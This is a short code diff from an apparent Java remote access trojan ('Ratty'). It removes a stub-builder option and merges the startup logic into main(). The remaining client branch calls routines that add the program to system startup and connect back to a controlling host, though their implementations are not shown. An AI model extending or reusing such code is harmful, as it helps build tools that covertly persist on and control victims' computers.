@@ -10,7 +10,6 @@ import javax.swing.JOptionPane;
 import com.alee.laf.WebLookAndFeel;
 
 import de.sogomn.engine.util.FileUtils;
-import de.sogomn.rat.builder.StubBuilder;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.gui.RattyGui;
 import de.sogomn.rat.server.gui.RattyGuiController;
@@ -21,7 +20,6 @@ public final class Ratty {
 	private static String address;
 	private static int port;
 	private static boolean client;
-	private static boolean builder;
 	
 	private static final String PORT_INPUT_MESSAGE = "Which port should the server be bind to?";
 	
@@ -46,12 +44,10 @@ public final class Ratty {
 			final String addressString = lines[0].trim();
 			final String portString = lines[1].trim();
 			final String clientString = lines[2].trim();
-			final String builderString = lines[3].trim();
 			
 			address = addressString;
 			port = Integer.parseInt(portString);
 			client = Boolean.parseBoolean(clientString);
-			builder = Boolean.parseBoolean(builderString);
 		}
 	}
 	
@@ -115,7 +111,11 @@ public final class Ratty {
 		server.start();
 	}
 	
-	public static void start() {
+	public static void main(final String[] args) {
+		WebLookAndFeel.install();
+		
+		readConnectionData();
+		
 		if (client) {
 			addToStartup();
 			connectToHost(address, port);
@@ -127,20 +127,6 @@ public final class Ratty {
 			}
 			
 			startServer(port);
-		}
-	}
-	
-	public static void main(final String[] args) {
-		WebLookAndFeel.install();
-		
-		readConnectionData();
-		
-		if (builder) {
-			StubBuilder.start();
-			
-			System.exit(0);
-		} else {
-			start();
 		}
 	}
 	
